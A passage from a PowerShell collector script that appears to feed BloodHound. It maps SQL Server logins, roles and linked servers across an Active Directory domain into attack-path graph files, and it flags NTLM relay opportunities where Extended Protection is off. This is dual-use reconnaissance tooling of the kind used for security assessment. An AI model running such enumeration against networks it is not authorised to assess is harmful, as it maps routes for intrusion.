                        if ($roleName -and $fixedServerRolePermissions.ContainsKey($roleName)) {
                            if ($fixedServerRolePermissions[$roleName] -contains "CONNECT SQL") {
                                $permissionToConnect = $true
                                break
                            }
                        }
                    }
                }
                
                if ($permissionToConnect -and $loginEnabled) {

                    # CoerceAndRelayToMSSQL edge if EPA is Off and login is for a computer object
                    if ($serverInfo.ExtendedProtection -eq "Off" -and $principal.Name -match '\$$') {

                        $authedUsersObjectId = "$script:Domain`-S-1-5-11"

                        # Add node for Authenticated Users so we don't get Unknown kind
                        Add-Node -Id $authedUsersObjectId `
                                -Kinds $("Group", "Base") `
                                -Properties @{
                                    name = "AUTHENTICATED USERS@$($script:Domain)"
                                }
                        
                        Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $authedUsersObjectId } -TargetPrincipal $principal -SourceType "Group" -TargetType "MSSQL_Login"
                        Add-Edge -Source $authedUsersObjectId `
                                -Target $principal.ObjectIdentifier `
                                -Kind "CoerceAndRelayToMSSQL"
                    }

                    # Filter duplicate source nodes
                    if (-not $principalsWithLogin.Contains($principal.SecurityIdentifier)) {
                        
                        # Filter out domain SIDs for NT AUTHORITY\SYSTEM and NT SERVICE*
                        if ($principal.SecurityIdentifier -like "S-1-5-21-*") {

                            $domainPrincipal = Resolve-DomainPrincipal $principal.Name.Split('\')[1]
                            if (-not $domainPrincipal.SID) {
                                $domainPrincipal = Resolve-DomainPrincipal $principal.SecurityIdentifier
                            }
                            
                            # Don't create edges from non-domain objects like user-defined local groups and users
                            if ($domainPrincipal.SID) {

                                # Add node so we don't get Unknown kind
                                Add-Node -Id $domainPrincipal.SID `
                                        -Kinds $($domainPrincipal.Type, "Base") `
                                        -Properties @{
                                            name = $domainPrincipal.Name
                                            distinguishedName = $domainPrincipal.DistinguishedName
                                            DNSHostName = $domainPrincipal.DNSHostName
                                            domain = $domainPrincipal.Domain
                                            isDomainPrincipal = $domainPrincipal.IsDomainPrincipal
                                            isEnabled = $domainPrincipal.Enabled
                                            SAMAccountName = $domainPrincipal.SamAccountName
                                            SID = $domainPrincipal.SID
                                            userPrincipalName = $domainPrincipal.UserPrincipalName
                                        }

                                # Track this principal as having a login
                                [void]$principalsWithLogin.Add($principal.SecurityIdentifier)

                                # MSSQL_HasLogin edge
                                Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $principal.SecurityIdentifier } -TargetPrincipal $principal -SourceType "User" -TargetType "MSSQL_Login"
                                Add-Edge -Source $principal.SecurityIdentifier `
                                -Target $principal.ObjectIdentifier `
                                -Kind "MSSQL_HasLogin"
                            } else {
                                Write-Verbose "No domain SID found for $($domainPrincipal.SID)"
                            }

                        # Well-known local group SIDs
                        } elseif ($principal.SecurityIdentifier -like "S-1-5-32-*") {

                            $groupObjectId = "$serverFQDN`-$($principal.SecurityIdentifier)"

                            # Track this principal as having a login
                            [void]$principalsWithLogin.Add($groupObjectId)

                            # Add node so we don't get Unknown kind
                            Add-Node -Id $groupObjectId `
                                    -Kinds $("Group", "Base") `
                                    -Properties @{
                                        name = $principal.Name
                                        isActiveDirectoryPrincipal = $principal.IsActiveDirectoryPrincipal
                                    }

                            # MSSQL_HasLogin edge
                            Set-EdgeContext -SourcePrincipal @{ ObjectIdentifier = $groupObjectId } -TargetPrincipal $principal -SourceType "Group" -TargetType "MSSQL_Login"
                            Add-Edge -Source $groupObjectId `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_HasLogin"

                        } else {
                            Write-Verbose "Skipping local principal $($principal.SecurityIdentifier)"
                        }
                    } else {
                        Write-Verbose "Skipping duplicate login $($principal.SecurityIdentifier)"
                    }
                }
            }
        }
    }

    # Server contains
    Write-Host "Creating contains edges for server principals"
    foreach ($principal in $serverInfo.ServerPrincipals) {
        if ($principal.TypeDescription -eq "SERVER_ROLE") {

            Set-EdgeContext -SourcePrincipal $serverInfo -TargetPrincipal $principal
            Add-Edge -Source $serverInfo.ObjectIdentifier `
                    -Target $principal.ObjectIdentifier `
                    -Kind "MSSQL_Contains"
        }
        elseif ($principal.TypeDescription -in @("WINDOWS_LOGIN", "WINDOWS_GROUP", "SQL_LOGIN", "ASYMMETRIC_KEY_MAPPED_LOGIN", "CERTIFICATE_MAPPED_LOGIN")) {

            Set-EdgeContext -SourcePrincipal $serverInfo -TargetPrincipal $principal
            Add-Edge -Source $serverInfo.ObjectIdentifier `
                    -Target $principal.ObjectIdentifier `
                    -Kind "MSSQL_Contains"
        }
    }

    # Database contains
    Write-Host "Creating contains edges for database principals"
    foreach ($db in $serverInfo.Databases) {
        foreach ($principal in $db.DatabasePrincipals) {
            # Determine target principal node type
            $targetNodeType = switch ($principal.TypeDescription) {
                "DATABASE_ROLE" { "MSSQL_DatabaseRole" }
                "APPLICATION_ROLE" { "MSSQL_ApplicationRole" }
                { $_ -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER") } { "MSSQL_DatabaseUser" }
            }
            
            if ($targetNodeType) {

                Set-EdgeContext -SourcePrincipal $db -TargetPrincipal $principal -DatabaseName $db.Name

                # Create the appropriate edge based on type
                if ($principal.TypeDescription -eq "DATABASE_ROLE") {
                    Add-Edge -Source $db.ObjectIdentifier `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_Contains"
                }
                elseif ($principal.TypeDescription -in @("WINDOWS_USER", "WINDOWS_GROUP", "SQL_USER", "ASYMMETRIC_KEY_MAPPED_USER", "CERTIFICATE_MAPPED_USER")) {
                    Add-Edge -Source $db.ObjectIdentifier `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_Contains"
                }
                elseif ($principal.TypeDescription -eq "APPLICATION_ROLE") {
                    Add-Edge -Source $db.ObjectIdentifier `
                            -Target $principal.ObjectIdentifier `
                            -Kind "MSSQL_Contains"
                }
            }
        }
    }
    return $serverInfo
}

# Begin main execution

if ($ServerInstance) {
    try {
        Get-MSSQLServerFromString -Server $ServerInstance
    }
    catch {
        Write-Warning "Could not identify provided MSSQL server: $_"
    }

} elseif ($ServerListFile) {
    if (Test-Path $ServerListFile) {
        Write-Host "Reading server list from file: $ServerListFile" -ForegroundColor Cyan
        $serversFromFile = Get-Content $ServerListFile
        foreach ($server in $serversFromFile) {
            Parse-ServerListEntry -Entry $server
        }
        Write-Host "Added $($serversFromFile.Count) servers from file" -ForegroundColor Green
    } else {
        Write-Error "Server list file not found: $ServerListFile"
        return
    }

} elseif ($ServerList) {
    Write-Host "Processing comma-separated server list" -ForegroundColor Cyan
    $listServers = $ServerList -split ','
    foreach ($server in $listServers) {
        Parse-ServerListEntry -Entry $server
    }
    Write-Host "Added $($listServers.Count) servers from list" -ForegroundColor Green

} else {
    # Collect MSSQL SPNs from Active Directory if domain is available
    try {
        Get-MSSQLServersFromSPNs
    }
    catch {
        Write-Warning "Could not collect MSSQL SPNs from Active Directory: $_"
    }
}

# If no servers to process, exit
if ($script:serversToProcess.Count -eq 0) {
    Write-Host "No SQL servers to process. Specify -ServerInstance, -ServerListFile, -ServerList, or ensure SPNs are discoverable in AD." -ForegroundColor Yellow
    return
}

# If user specified this option, exit
if ($DomainEnumOnly) {
    if ($script:serversToProcess.Count -gt 0) {
        Write-Host "SQL servers to process:`n    $(($serversToProcess.GetEnumerator() | ForEach-Object { "$($_.Value.ServerName) ($($_.Value.ObjectIdentifier))" }) -join "`n    ")"    }
    return
}

Write-Host "`nProcessing $($script:serversToProcess.Count) SQL Server(s)..." -ForegroundColor Cyan

# Wrap everything in try-finally to ensure proper cleanup
try {
    # Keep track of processed servers to avoid infinite loops
    $processedServers = @()
    $serverCount = 0
    $stopProcessing = $false

    # Clear any existing collections to ensure we start fresh
    $script:bloodhoundOutput = $null
    $script:nodesOutput = $null
    $script:edgesOutput = $null

    # Process initial servers
    foreach ($serverToProcess in $script:serversToProcess.Values) {
        if ($stopProcessing) { break }
        
        $serverCount++
        
        # Check memory after processing every server
        if ($serverCount % 1 -eq 0) {
            if (-not (Test-MemoryUsage -Threshold $MemoryThresholdPercent)) {
                Write-Warning "Stopping enumeration due to high memory usage after $serverCount servers"
                $stopProcessing = $true
                break
            }
            
            # Force garbage collection periodically
            [System.GC]::Collect()
            [System.GC]::WaitForPendingFinalizers()
            [System.GC]::Collect()
        }
        
        Write-Host "`n[$serverCount/$($script:serversToProcess.Count)] Processing $($serverToProcess.ServerFullName)..." -ForegroundColor Cyan
        
        # Clear temporary collections before processing each server
        if ($OutputFormat -eq "BloodHound" -or $OutputFormat -eq "BHGeneric") {
            
            # Re-initialize the collection structures for this server
            if ($OutputFormat -eq "BloodHound") {
                $script:bloodhoundOutput = @{
                    graph = @{
                        nodes = @()
                        edges = @()
                    }
                }
            } elseif ($OutputFormat -eq "BHGeneric") {
                $script:nodesOutput = @()
                $script:edgesOutput = @()
            }
        }
        
        $serverResult = Process-ServerInstance -ServerName $serverToProcess.ServerName -Port $serverToProcess.Port -InstanceName $serverToProcess.InstanceName
        
        if ($serverResult) {
            Write-Host "Server result obtained for $($serverToProcess.ServerName)"

            switch ($OutputFormat) {

                "BloodHound" {

                    # Debug: Check what's in bloodhoundOutput
                    if ($script:bloodhoundOutput) {
                        Write-Host "BloodHound nodes: $($script:bloodhoundOutput.graph.nodes.Count)" -ForegroundColor Cyan
                        Write-Host "BloodHound edges: $($script:bloodhoundOutput.graph.edges.Count)" -ForegroundColor Cyan
                        
                        # Extract nodes and edges from the bloodhoundOutput
                        if ($script:bloodhoundOutput.graph) {
                            # Create filename with server name, port, and instance
                            $filenameParts = @($serverToProcess.ServerName)
                            if ($serverToProcess.Port -and $serverToProcess.Port -ne 1433) {
                                $filenameParts += $serverToProcess.Port
                            }
                            if ($serverToProcess.InstanceName -and $serverToProcess.InstanceName -ne "MSSQLSERVER") {
                                $filenameParts += $serverToProcess.InstanceName
                            }
                            $cleanedName = ($filenameParts -join '_') -replace '[\\/:*?"<>|]', '_'
                            $serverFileName = "mssql-$cleanedName.json"  
                            $serverFilePath = Join-Path $TempDirectory $serverFileName
                            $serverWriter = $null
                            
                            try {
                                $serverWriter = New-StreamingBloodHoundWriter -FilePath $serverFilePath
                                Write-Host "Writing to file: $serverFilePath" -ForegroundColor Cyan
                                
                                # Write all nodes for this server
                                foreach ($node in $script:bloodhoundOutput.graph.nodes) {
                                    Write-BloodHoundNode -WriterObj $serverWriter -Node $node
                                }
                                
                                # Write all edges for this server
                                foreach ($edge in $script:bloodhoundOutput.graph.edges) {
                                    Write-BloodHoundEdge -WriterObj $serverWriter -Edge $edge
                                }
                                
                                Write-Host "Wrote $(($script:bloodhoundOutput.graph.nodes).Count) nodes and $(($script:bloodhoundOutput.graph.edges).Count) edges for $($serverToProcess.ServerName)" -ForegroundColor Green
                                
                                # Show final size before closing
                                Show-CurrentFileSize -WriterObj $serverWriter -Context "finalizing $($serverToProcess.ServerName)"

                                # Close this server's file
                                Close-BloodHoundWriter -WriterObj $serverWriter
                                
                                # Add to tracked files
                                $script:OutputFiles += $serverFilePath
                            }
                            catch {
                                Write-Error "Failed to write BloodHound data for $($serverToProcess.ServerName): $_"
                                if ($serverWriter) {
                                    try { Close-BloodHoundWriter -WriterObj $serverWriter } catch {}
                                }
                            }
                        }
                    } else {
                        Write-Warning "No BloodHound output generated for $($serverToProcess.ServerName)"
                    }
                    # Clear collections
                    $script:bloodhoundOutput = $null
                }

                "BHGeneric" {

                    if ($script:nodesOutput -or $script:edgesOutput) {
                        # Create filename with server name, port, and instance
                        $filenameParts = @($serverToProcess.ServerName)
                        if ($serverToProcess.Port -and $serverToProcess.Port -ne 1433) {
                            $filenameParts += $serverToProcess.Port
                        }
                        if ($serverToProcess.InstanceName -and $serverToProcess.InstanceName -ne "MSSQLSERVER") {
                            $filenameParts += $serverToProcess.InstanceName
                        }
                        $cleanedName = ($filenameParts -join '_') -replace '[\\/:*?"<>|]', '_'
                        $serverFileName = "mssql-$cleanedName.json"
                        $serverFilePath = Join-Path $TempDirectory $serverFileName
                        $serverWriter = $null
                        
                        try {
                            $serverWriter = New-StreamingBHGenericWriter -FilePath $serverFilePath
                            Write-Host "Writing to file: $serverFilePath" -ForegroundColor Cyan
                            
                            # Write nodes and edges
                            foreach ($node in $script:nodesOutput) {
                                Write-BHGenericNode -WriterObj $serverWriter -Node $node
                            }
                            foreach ($edge in $script:edgesOutput) {
                                Write-BHGenericEdge -WriterObj $serverWriter -Edge $edge
                            }
                            
                            Write-Host "Wrote $($script:nodesOutput.Count) nodes and $($script:edgesOutput.Count) edges for $($serverToProcess.ServerName)" -ForegroundColor Green
                            
                            # Close this server's file
                            Close-BHGenericWriter -WriterObj $serverWriter
                            
                            # Add to tracked files
                            $script:OutputFiles += $serverFilePath
                            
                            # Show file sizes
                            if (Test-Path $serverFilePath) {
                                $fileInfo = Get-Item $serverFilePath
                                Write-Host "File size: $([math]::Round($fileInfo.Length/1KB, 2)) KB" -ForegroundColor Green
                                
                                # Calculate and show cumulative
                                $cumulativeSize = 0
                                foreach ($file in $script:OutputFiles) {
                                    if (Test-Path $file) {
                                        $cumulativeSize += (Get-Item $file).Length
                                    }
                                }
                                Write-Host "Cumulative size: $([math]::Round($cumulativeSize/1MB, 2)) MB across $($script:OutputFiles.Count) files" -ForegroundColor Cyan
                            }
                        }
                        catch {
                            Write-Error "Failed to write BHGeneric data for $($serverToProcess.ServerName): $_"
                            if ($serverWriter) {
                                try { Close-BHGenericWriter -WriterObj $serverWriter } catch {}
                            }
                        }
                    }
                    # Clear collections
                    $script:nodesOutput = $null
                    $script:edgesOutput = $null
                }
            }
        } else {
            Write-Warning "No result obtained for $($serverToProcess.ServerName)"
        }
        
        # Add to processed list
        $processedServers += $serverToProcess.ServerName.ToLower()
    }

    # Process linked servers recursively
    while ($script:linkedServersToProcess.Count -gt 0 -and -not $stopProcessing) {
        # Get the current list of linked servers to process
        $currentLinkedServers = $script:linkedServersToProcess
        $script:linkedServersToProcess = @()  # Reset for new discoveries
        
        foreach ($serverToProcess in $currentLinkedServers) {
            if ($stopProcessing) { break }
            
            # Skip if already processed
            if ($serverToProcess -in $processedServers) {
                Write-Host "Skipping already processed server: $serverToProcess" -ForegroundColor Yellow
                continue
            }
            
            $serverCount++
            
            # Check memory every 5 servers
            if ($serverCount % 5 -eq 0) {
                if (-not (Test-MemoryUsage -Threshold $MemoryThresholdPercent)) {
                    Write-Host "Stopping enumeration due to high memory usage after $serverCount servers" -ForegroundColor Red
                    $stopProcessing = $true
                    break
                }
                
                # Force garbage collection
                [System.GC]::Collect()
                [System.GC]::WaitForPendingFinalizers()
                [System.GC]::Collect()
            }
            
            Write-Host "`n[$serverCount] Processing linked server: $serverToProcess..." -ForegroundColor Cyan
            
            # Clear collections before processing
            if ($OutputFormat -eq "BloodHound" -or $OutputFormat -eq "BHGeneric") {
                if ($OutputFormat -eq "BloodHound") {
                    $script:bloodhoundOutput = @{
                        graph = @{
                            nodes = @()
                            edges = @()
                        }
                    }
                } else {
                    $script:nodesOutput = @()
                    $script:edgesOutput = @()
                }
            }
            
            $serverResult = Process-ServerInstance $serverToProcess
            
            if ($serverResult) {
                Write-Host "Server result obtained for $serverToProcess"
                Write-Host "Constructing nodes and edges and saving to file..."
    
                switch ($OutputFormat) {
                    
                    "BloodHound" {
    
                        # Debug: Check what's in bloodhoundOutput
                        if ($script:bloodhoundOutput) {
                            Write-Host "BloodHound nodes: $($script:bloodhoundOutput.graph.nodes.Count)" -ForegroundColor Cyan
                            Write-Host "BloodHound edges: $($script:bloodhoundOutput.graph.edges.Count)" -ForegroundColor Cyan
                            
                            # Extract nodes and edges from the bloodhoundOutput
                            if ($script:bloodhoundOutput.graph) {
                                $filenameParts = @($serverResult.Name)
                                $cleanedName = ($filenameParts -join '_') -replace '[\\/:*?"<>|]', '_'
                                $serverFileName = "mssql-$cleanedName.json"  
                                $serverFilePath = Join-Path $TempDirectory $serverFileName
                                $serverWriter = $null
                                
                                try {
                                    $serverWriter = New-StreamingBloodHoundWriter -FilePath $serverFilePath
                                    Write-Host "Writing to file: $serverFilePath" -ForegroundColor Cyan
                                    
                                    # Write all nodes for this server
                                    foreach ($node in $script:bloodhoundOutput.graph.nodes) {
                                        Write-BloodHoundNode -WriterObj $serverWriter -Node $node
                                    }
                                    
                                    # Write all edges for this server
                                    foreach ($edge in $script:bloodhoundOutput.graph.edges) {
                                        Write-BloodHoundEdge -WriterObj $serverWriter -Edge $edge
                                    }
                                    
                                    Write-Host "Wrote $(($script:bloodhoundOutput.graph.nodes).Count) nodes and $(($script:bloodhoundOutput.graph.edges).Count) edges for $serverToProcess" -ForegroundColor Green
                                    
                                    # Show final size before closing
                                    Show-CurrentFileSize -WriterObj $serverWriter -Context "finalizing $serverToProcess"
    
                                    # Close this server's file
                                    Close-BloodHoundWriter -WriterObj $serverWriter
                                    
                                    # Add to tracked files
                                    $script:OutputFiles += $serverFilePath
                                }
                                catch {
                                    Write-Error "Failed to write BloodHound data for $($serverToProcess): $_"
                                    if ($serverWriter) {
                                        try { Close-BloodHoundWriter -WriterObj $serverWriter } catch {}
                                    }
                                }
                                
                                # Show progress after each server
                                Write-Host "Processed $(($script:bloodhoundOutput.graph.nodes).Count) nodes and $(($script:bloodhoundOutput.graph.edges).Count) edges for $serverToProcess" -ForegroundColor Green
                            }
                        } else {
                            Write-Warning "No BloodHound output generated for $serverToProcess"
                        }
                        # Clear collections
                        $script:bloodhoundOutput = $null
                    }
    
                    "BHGeneric" {
    
                        if ($script:nodesOutput -or $script:edgesOutput) {
                            $filenameParts = @($serverResult.Name)
                            $cleanedName = ($filenameParts -join '_') -replace '[\\/:*?"<>|]', '_'
                            $serverFileName = "mssql-$cleanedName.json"
                            $serverFilePath = Join-Path $TempDirectory $serverFileName
                            $serverWriter = $null
                            
                            try {
                                $serverWriter = New-StreamingBHGenericWriter -FilePath $serverFilePath
                                Write-Host "Writing to file: $serverFilePath" -ForegroundColor Cyan
                                
                                # Write nodes and edges
                                foreach ($node in $script:nodesOutput) {
                                    Write-BHGenericNode -WriterObj $serverWriter -Node $node
                                }
                                foreach ($edge in $script:edgesOutput) {
                                    Write-BHGenericEdge -WriterObj $serverWriter -Edge $edge
                                }
                                
                                Write-Host "Wrote $($script:nodesOutput.Count) nodes and $($script:edgesOutput.Count) edges for $serverToProcess" -ForegroundColor Green
                                
                                # Close this server's file
                                Close-BHGenericWriter -WriterObj $serverWriter
                                
                                # Add to tracked files
                                $script:OutputFiles += $serverFilePath
                                
                                # Show file sizes
                                if (Test-Path $serverFilePath) {
                                    $fileInfo = Get-Item $serverFilePath
                                    Write-Host "File size: $([math]::Round($fileInfo.Length/1KB, 2)) KB" -ForegroundColor Green
                                    
                                    # Calculate and show cumulative
                                    $cumulativeSize = 0
                                    foreach ($file in $script:OutputFiles) {
                                        if (Test-Path $file) {
                                            $cumulativeSize += (Get-Item $file).Length
                                        }
                                    }
                                    Write-Host "Cumulative size: $([math]::Round($cumulativeSize/1MB, 2)) MB across $($script:OutputFiles.Count) files" -ForegroundColor Cyan
                                }
                            }
                            catch {
                                Write-Error "Failed to write BHGeneric data for $($serverToProcess): $_"
                                if ($serverWriter) {
                                    try { Close-BHGenericWriter -WriterObj $serverWriter } catch {}
                                }
                            }
                        }
                        # Clear collections
                        $script:nodesOutput = $null
                        $script:edgesOutput = $null
                    }
                }
            } else {
                Write-Warning "No result obtained for $serverToProcess"
            }
            
            # Mark as processed
            $processedServers += $serverToProcess.ToLower()
        }
    }


    if ($stopProcessing) {
        Write-Host "`nEnumeration was stopped early due to memory or file size constraints" -ForegroundColor Red
        Write-Host "Enumeration complete. Total servers processed: $($processedServers.Count)" -ForegroundColor Red
    } else {
        Write-Host "Enumeration complete. Total servers processed: $($processedServers.Count)" -ForegroundColor Green
    }
}

finally {
    # Always output what we can even if the script was stopped
    if ($script:OutputFiles.Count -gt 0) {
        Write-Host "`nOutput files created:" -ForegroundColor Cyan
        $totalSize = 0
        
        foreach ($file in $script:OutputFiles) {
            if (Test-Path $file) {
                $fileInfo = Get-Item $file
                $totalSize += $fileInfo.Length
                
                $sizeDisplay = if ($fileInfo.Length -ge 1MB) {
                    "$([math]::Round($fileInfo.Length/1MB, 2)) MB"
                } elseif ($fileInfo.Length -ge 1KB) {
                    "$([math]::Round($fileInfo.Length/1KB, 2)) KB"
                } else {
                    "$($fileInfo.Length) bytes"
                }
                
                Write-Host "  $file - $sizeDisplay" 
            }
        }
        
        # Show total size
        $totalSizeDisplay = if ($totalSize -ge 1GB) {
            "$([math]::Round($totalSize/1GB, 2)) GB"
        } elseif ($totalSize -ge 1MB) {
            "$([math]::Round($totalSize/1MB, 2)) MB"
        } elseif ($totalSize -ge 1KB) {
            "$([math]::Round($totalSize/1KB, 2)) KB"
        } else {
            "$totalSize bytes"
        }
        
        if ($stopProcessing) {
            $foregroundColor = "Red"
        } else {
            $foregroundColor = "Green"
        }
        Write-Host "`nTotal size: $totalSizeDisplay across $($script:OutputFiles.Count) files" -ForegroundColor $foregroundColor
        
        # Automatically compress if CompressOutput is specified or if there are multiple files
        if ($script:OutputFiles.Count -gt 0) {

            try {
                # Generate timestamp for unique filename
                $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
                $zipFileName = "mssql-bloodhound-$timestamp.zip"
                # Always output zip to current directory
                if ($ZipDir) {
                    $zipFilePath = $ZipDir
                } else {
                    $zipFilePath = Join-Path (Get-Location).Path $zipFileName
                }

                # PowerShell version check
                if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
                    # PowerShell 5.0+ has built-in compression
                    Compress-Archive -Path $script:OutputFiles -DestinationPath $zipFilePath -CompressionLevel Optimal
                } else {
                    # For older PowerShell versions, use .NET
                    Write-Host "Using .NET compression for PowerShell v$($PSVersionTable.PSVersion.Major)" -ForegroundColor Cyan
                    
                    # Load the required assembly
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    
                    # Create the ZIP file
                    $compressionLevel = [System.IO.Compression.CompressionLevel]::Optimal
                    
                    # Ensure the ZIP file doesn't already exist
                    if (Test-Path $zipFilePath) {
                        Remove-Item $zipFilePath -Force
                    }
                    
                    # Create the ZIP archive
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                    
                    try {
                        foreach ($file in $script:OutputFiles) {
                            if (Test-Path $file) {
                                Write-Verbose "  Adding: $(Split-Path $file -Leaf)"
                                $entryName = [System.IO.Path]::GetFileName($file)
                                $null = [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file, $entryName, $compressionLevel)
                            }
                        }
                    }
                    finally {
                        # Always dispose of the ZIP archive
                        if ($zipArchive) {
                            $zipArchive.Dispose()
                        }
                    }
                }
                
                # Verify ZIP was created
                if (Test-Path $zipFilePath) {
                    $zipInfo = Get-Item $zipFilePath
                    $zipSizeDisplay = if ($zipInfo.Length -ge 1MB) {
                        "$([math]::Round($zipInfo.Length/1MB, 2)) MB"
                    } elseif ($zipInfo.Length -ge 1KB) {
                        "$([math]::Round($zipInfo.Length/1KB, 2)) KB"
                    } else {
                        "$($zipInfo.Length) bytes"
                    }
                    
                    Write-Host "ZIP archive created successfully: $zipFileName ($zipSizeDisplay)" -ForegroundColor Green
                    
                    # Calculate compression ratio
                    if ($totalSize -gt 0) {
                        $compressionRatio = [math]::Round((1 - ($zipInfo.Length / $totalSize)) * 100, 1)
                        Write-Host "Compression ratio: $compressionRatio% reduction" -ForegroundColor Cyan
                    }
                    
                    # Delete original files
                    Write-Host "Deleting original files..." -ForegroundColor Cyan
                    $deletedCount = 0
                    $failedDeletes = @()
                    
                    foreach ($file in $script:OutputFiles) {
                        if (Test-Path $file) {
                            try {
                                Remove-Item $file -Force -ErrorAction Stop
                                $deletedCount++
                            } catch {
                                $failedDeletes += $file
                                Write-Warning "Failed to delete: $(Split-Path $file -Leaf) - $_"
                            }
                        }
                    }
                    
                    if ($deletedCount -gt 0) {
                        Write-Host "Successfully deleted $deletedCount original files" -ForegroundColor Green
                    }
                    
                    if ($failedDeletes.Count -gt 0) {
                        Write-Warning "Failed to delete $($failedDeletes.Count) files. Manual cleanup required."
                    }
                    
                    # Final output location
                    $finalOutput = (Get-Item $zipFilePath).FullName
                    Write-Host "`nFinal output: $finalOutput" -ForegroundColor Green
                } else {
                    Write-Error "Failed to create ZIP archive"
                }
            } catch {
                Write-Error "Error creating ZIP archive: $_"
                Write-Host "Original files have been preserved" -ForegroundColor Yellow
            }
        } 
    } else {
        Write-Warning "No output files were created"
    }
}
